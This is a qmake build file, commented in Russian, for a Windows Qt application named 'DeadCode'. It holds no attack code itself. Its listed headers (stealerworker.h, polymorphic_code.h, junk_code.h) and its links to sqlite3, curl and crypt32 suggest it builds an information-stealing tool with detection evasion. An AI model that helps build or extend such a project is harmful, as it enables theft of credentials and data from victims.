# Основные модули Qt (синхронизированы с build.yml и aqtinstall)
QT += core gui network widgets qml quick svg declarative quickcontrols quickcontrols2 graphicaleffects sql quicktimeline quick3d winextras

# Указываем минимальную версию Qt
requires(qtConfig(version >= 5.15))

# Имя цели и тип приложения
TARGET = DeadCode
TEMPLATE = app

# Конфигурация для релиза (динамическая сборка Qt)
CONFIG += release

# Указываем спецификацию для MinGW (синхронизировано с build.yml)
QMAKE_SPEC = win32-g++

# Исходные файлы
SOURCES += \
    $$PWD/../src/main.cpp \
    $$PWD/mainwindow.cpp

# Заголовочные файлы
HEADERS += \
    $$PWD/mainwindow.h \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h \
    $$PWD/../src/stealerworker.h \
    $$PWD/../src/compat.h

# Формы Qt Designer
FORMS += \
    $$PWD/mainwindow.ui

# Файл ресурсов
RC_FILE = $$PWD/../icon.rc

# Пути для поиска заголовков
VCPKG_INCLUDE_DIR = $$(VCPKG_ROOT)/installed/x64-mingw-dynamic/include
isEmpty(VCPKG_INCLUDE_DIR):VCPKG_INCLUDE_DIR = C:/vcpkg/installed/x64-mingw-dynamic/include

QT_DIR = $$(QT_ROOT)
isEmpty(QT_DIR):QT_DIR = C:/Qt/5.15.2/mingw81_64

INCLUDEPATH += \
    $$PWD/../src \
    $$PWD \
    $$VCPKG_INCLUDE_DIR \
    $$QT_DIR/include

# Пути для поиска QML-модулей (для Qt Creator и runtime через QML2_IMPORT_PATH в build.yml)
QML_IMPORT_PATH += \
    $$QT_DIR/qml

# Библиотеки для линковки (синхронизированы с build.yml и vcpkg)
VCPKG_LIB_DIR = $$(VCPKG_ROOT)/installed/x64-mingw-dynamic/lib
isEmpty(VCPKG_LIB_DIR):VCPKG_LIB_DIR = C:/vcpkg/installed/x64-mingw-dynamic/lib

LIBS += -L$$VCPKG_LIB_DIR \
    -lsqlite3 \
    -lzip \
    -lzlib \
    -lbz2 \
    -lcurl \
    -lssl \
    -lcrypto \
    -lstdc++fs \
    -lws2_32 \
    -lcrypt32 \
    -lgdi32 \
    -luser32 \
    -ladvapi32

# Флаги компилятора (синхронизированы с build.yml)
QMAKE_CXXFLAGS += \
    -O2 \
    -std=c++17 \
    -Wall \
    -Wextra \
    -Werror=return-type \
    -fexceptions \
    -DUNICODE \
    -D_UNICODE \
    -DWIN32 \
    -DQT_NO_DEBUG \
    -D_CRT_SECURE_NO_WARNINGS \
    -Wno-deprecated-declarations \
    -Wno-cast-function-type \
    -Wno-unused-parameter \
    -Wno-sign-compare \
    -Wno-attributes

# Флаги линковщика (синхронизированы с build.yml)
QMAKE_LFLAGS += \
    -O2 \
    -Wl,-subsystem,windows \
    -Wl,--allow-multiple-definition

# Директории для сборки
DESTDIR = $$PWD/../build/release
OBJECTS_DIR = $$PWD/../build/release
MOC_DIR = $$PWD/../build/release
UI_DIR = $$PWD/../build/release
RCC_DIR = $$PWD/../build/release

# Расширенный список файлов для очистки
QMAKE_CLEAN += \
    $$DESTDIR/DeadCode.exe \
    $$OBJECTS_DIR/*.o \
    $$MOC_DIR/moc_*.cpp \
    $$UI_DIR/ui_*.h \
    $$RCC_DIR/qrc_*.cpp

# Настройки для Windows
win32 {
    CONFIG(debug, debug|release) {
        QMAKE_CXXFLAGS += -g
        QMAKE_LFLAGS -= -O2
        DESTDIR = $$PWD/../build/debug
        OBJECTS_DIR = $$PWD/../build/debug
        MOC_DIR = $$PWD/../build/debug
        UI_DIR = $$PWD/../build/debug
        RCC_DIR = $$PWD/../build/debug
        QMAKE_CLEAN += \
            $$DESTDIR/DeadCode.exe \
            $$OBJECTS_DIR/*.o \
            $$MOC_DIR/moc_*.cpp \
            $$UI_DIR/ui_*.h \
            $$RCC_DIR/qrc_*.cpp
    }
}

# Зависимости для пересборки
PRE_TARGETDEPS += \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h \
    $$PWD/../src/stealerworker.h \
    $$PWD/../src/compat.h

# Поддержка параллельной сборки (работает локально, в build.yml используется -j4)
QMAKE_EXTRA_TARGETS += -j4